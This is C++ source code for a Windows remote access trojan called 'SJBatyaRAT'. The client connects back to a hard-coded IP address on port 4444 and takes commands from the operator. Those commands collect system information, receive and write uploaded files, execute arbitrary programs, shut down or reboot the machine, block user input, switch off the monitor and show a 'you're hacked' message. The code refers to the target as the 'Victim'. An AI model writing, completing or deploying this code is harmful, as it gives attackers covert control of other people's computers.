#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdexcept>
#include <stdio.h>
#include <string.h>
#include <tchar.h>
#include <chrono>
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Ws2_32.lib")

void ReceiveFile(SOCKET server)
{
    char fileSizeBuffer[1024];
    int bytesReceived = recv(server, fileSizeBuffer, sizeof(fileSizeBuffer), 0);
    if (bytesReceived > 0)
    {
        fileSizeBuffer[bytesReceived] = '\0';
        std::string fileSizeStr(fileSizeBuffer);

        size_t fileSize = 0;
        try {
            fileSize = std::stoull(fileSizeStr);
        }
        catch (const std::invalid_argument& ex) {
            printf("Invalid file size: %s\n", fileSizeStr.c_str());
            return;
        }
        catch (const std::out_of_range& ex) {
            printf("File size out of range: %s\n", fileSizeStr.c_str());
            return;
        }

        std::string fileName;
        char buffer[1024];
        bytesReceived = recv(server, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0)
        {
            buffer[bytesReceived] = '\0';
            fileName = buffer;
        }
        else
        {
            printf("Error receiving file name\n");
            return;
        }

        std::ofstream file(fileName, std::ios::binary);
        if (!file.is_open())
        {
            printf("Failed to create file\n");
            return;
        }

        size_t bytesReceivedTotal = 0;
        while (bytesReceivedTotal < fileSize)
        {
            int remainingBytes = fileSize - bytesReceivedTotal;
            int bytesToReceive = remainingBytes < 1024 ? remainingBytes : 1024;
            bytesReceived = recv(server, buffer, bytesToReceive, 0);
            if (bytesReceived > 0)
            {
                file.write(buffer, bytesReceived);
                bytesReceivedTotal += bytesReceived;
            }
            else
            {
                printf("Error receiving file\n");
                file.close();
                return;
            }
        }

        file.close();
        printf("File received: %s\n", fileName.c_str());
    }
    else
    {
        printf("Error receiving file size\n");
        return;
    }
}

void ExecuteCommand(const std::string& command)
{
    HINSTANCE hInstance = ShellExecute(NULL, "open", command.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
    if ((int)hInstance <= 32)
    {
        printf("Failed to execute command\n");
        return;
    }
}

bool IsElevated()
{
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
        {
            isElevated = (elevation.TokenIsElevated != 0);
        }
    }

    if (hToken)
    {
        CloseHandle(hToken);
    }

    return (isElevated != FALSE);
}

int main(int argc, char* argv[])
{
    // FreeConsole();

    // if (!IsElevated())
    // {
    //     MessageBox(NULL, "Run as admin!", "Fatal error", MB_OK | MB_ICONEXCLAMATION);
    //     exit(1);
    // }

    char* ip_addr = "192.168.31.135";
    int port = 4444;

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(4444); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET s = socket(AF_INET, SOCK_STREAM, NULL);
    if (connect(s, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
        printf("Failed to connect\n%d\n", WSAGetLastError());
        system("pause");
        exit(1);
    }

    // debug
    printf("");

    char buff[1024];
    while (true)
    {
        int bytesReceived = recv(s, buff, sizeof(buff), 0);
        if (bytesReceived > 0) 
        {
            buff[bytesReceived] = '\0';
            std::string command(buff);
            if (command == "msgbox") {
                std::string callback = "Message box was summoned!";
                send(s, callback.c_str(), callback.size(), 0);

                MessageBox(NULL, "U're hacked by SJBatyaRAT!", "SJBatyaRAT", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
            }
            else if (command == "sysinfo" || command == "systeminfo" || command == "info") {
                OSVERSIONINFOEX osvi;
                ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
                osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
                GetVersionEx((LPOSVERSIONINFO)&osvi);

                std::string systemInfo = "System: " + std::to_string(osvi.dwMajorVersion) + "." +
                                        std::to_string(osvi.dwMinorVersion) + "." +
                                        std::to_string(osvi.dwBuildNumber) + " " +
                                        osvi.szCSDVersion;

                std::string architecture = "Architecture: " + std::string(sizeof(void*) == 8 ? "64-bit" : "32-bit");

                char computerName[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD computerNameSize = sizeof(computerName);
                GetComputerNameA(computerName, &computerNameSize);
                std::string computerNameStr(computerName, computerNameSize);

                std::string elevated;
                if (IsElevated()) 
                    elevated = "Elevated: Running as Admin";
                else 
                    elevated = "Elevated: Running NOT as Admin";

                char clientIP[INET_ADDRSTRLEN];
                struct sockaddr_in addr_in;
                int addrSize = sizeof(addr_in);
                getpeername(s, (struct sockaddr*)&addr_in, &addrSize);
                const char* clientIPStr = inet_ntop(AF_INET, &(addr_in.sin_addr), clientIP, INET_ADDRSTRLEN);
                std::string clientIPInfo = "Client IP: " + std::string(clientIPStr);

                std::string processor = "Processor: " + std::string("TODO: Retrieve processor information");
                std::string username = "User: " + std::string("TODO: Retrieve username");

                std::string output = systemInfo + "\n" + architecture + "\n" + "Name of Computer: " + computerNameStr + "\n" +
                                    processor + "\n" + elevated + "\n" + username + "\n" + clientIPInfo;
                            
                send(s, output.c_str(), output.size(), 0);
            }
            else if (command.substr(0, 6) == "upload")
            {
                std::string filePath = command.substr(7);
                ReceiveFile(s);
            }
            else if (command.substr(0, 7) == "execute")
            { 
                std::string cmd = command.substr(8);
                std::string output = cmd + " was executed!";
                send(s, output.c_str(), output.size(), 0);
                ExecuteCommand(cmd);
            }
            else if (command == "shutdown") {
                std::string callback = "Victim's computer was turned off";
                send(s, callback.c_str(), callback.size(), 0);
                system("shutdown /s /t 0");
            }
            else if (command == "reboot") {
                std::string callback = "Victim's computer was rebooted";
                send(s, callback.c_str(), callback.size(), 0);
                system("shutdown /r /t 0");
            }
            else if (command == "ping") {
                // Измерение времени отклика и отправка обратно серверу
                auto start = std::chrono::high_resolution_clock::now();
                send(s, reinterpret_cast<char*>(&start), sizeof(start), 0);

                // Ожидание получения запроса на время отклика и отправка обратно
                std::chrono::high_resolution_clock::time_point end = std::chrono::high_resolution_clock::now();
                send(s, reinterpret_cast<char*>(&end), sizeof(end), 0);
            }
            else if (command == "input on") {
                BlockInput(FALSE);
                std::string callback = "Input enabled";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "input off") {
                BlockInput(TRUE);
                std::string callback = "Input disabled";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "monitor on") {
                HWND h = FindWindow(0, 0);
                SendMessage(h, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
                std::string callback = "Monitor was turned on";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "monitor off") {
                HWND h = FindWindow(0, 0);
                SendMessage(h, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
                std::string callback = "Monitor was turned off";
                send(s, callback.c_str(), callback.size(), 0);
            }

            else if (command == "exit" || command == "quit" || command == "bye") {
                std::string callback = "Client terminated...";
                send(s, callback.c_str(), callback.size(), 0);
                exit(0);
            }
        }
    }

    Sleep(2000);  // Задержка на 2 секунды перед закрытием консоли

    closesocket(s);
    WSACleanup();
    return 0;
}